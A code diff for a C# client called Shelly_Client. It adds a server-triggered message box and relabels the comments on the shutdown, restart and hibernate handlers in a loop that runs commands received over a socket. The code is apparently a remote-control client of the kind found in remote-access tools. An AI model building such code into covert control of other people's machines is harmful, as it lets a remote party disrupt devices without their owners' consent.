@@ -22,8 +22,6 @@ namespace Shelly_Client
                     Environment.Exit(0);
                     break;
 
-
-                // Send ping to server
                 case "disconnect":
 
                     // Disconnect and exit
@@ -37,7 +35,14 @@ namespace Shelly_Client
                     SocketHandler.Send(Functions.General.Ping());
                     break;
 
-                // Send ping to server
+                // Display messagebox
+                case "messagebox":
+
+                    // Display messagebox
+                    Functions.General.MsgBox(SocketHandler.Receive());
+                    break;
+
+                // Shutdown computer
                 case "shutdown":
 
                     // Shutdown
@@ -47,7 +52,7 @@ namespace Shelly_Client
                     SocketHandler.ShutdownClient();
                     break;
 
-                // Send ping to server
+                // Restart computer
                 case "restart":
                     Functions.PowerOptions.Restart();
 
@@ -55,7 +60,7 @@ namespace Shelly_Client
                     SocketHandler.ShutdownClient();
                     break;
 
-                // Send ping to server
+                // Hibernate computer
                 case "hibernate":
                     Functions.PowerOptions.Hibernate();
 
